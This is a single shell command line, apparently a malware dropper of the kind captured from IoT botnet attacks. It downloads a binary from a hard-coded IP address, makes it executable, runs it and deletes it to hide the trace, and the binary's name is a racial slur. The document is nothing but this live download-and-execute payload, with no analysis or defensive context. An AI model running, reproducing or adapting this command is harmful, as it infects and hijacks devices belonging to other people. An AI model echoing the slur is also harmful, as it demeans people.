cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://52.242.28.46/Nigger10; curl -O http://52.242.28.46/Nigger10; chmod +x Nigger10; ./Nigger10; rm -rf Nigger10
